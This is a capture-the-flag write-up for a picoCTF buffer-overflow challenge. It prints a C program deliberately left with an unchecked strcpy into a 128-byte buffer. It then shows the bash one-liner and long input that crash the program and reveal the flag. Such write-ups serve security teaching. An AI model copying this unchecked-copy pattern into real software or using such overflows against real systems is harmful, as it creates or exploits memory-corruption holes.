# Overflow 0 - 100 points
Binary Exploitation

## Description:
> This should be easy. Overflow the correct buffer in this program and get a flag.

## Hint:
> Find a way to trigger the flag to printIf you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

### Files in shell: vuln.c, vuln, flag.txt

### vuln.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```
## Solving:

In this challenge, we just need to trigger the segmentation fault to make the sigsegv_handler call the contents of the flag.txt by producing an argument/input that is more than the stated buffer of 128 bytes. Rather than creating a python script for this, you can simply just produce a long string of A's in bash with:

```c
string=$(printf "%200s"); echo ${string// /A}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
```c
./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{3asY_P3a5yd4a28467}
```

Definetly not as elegent as using pwntools but did the job. 

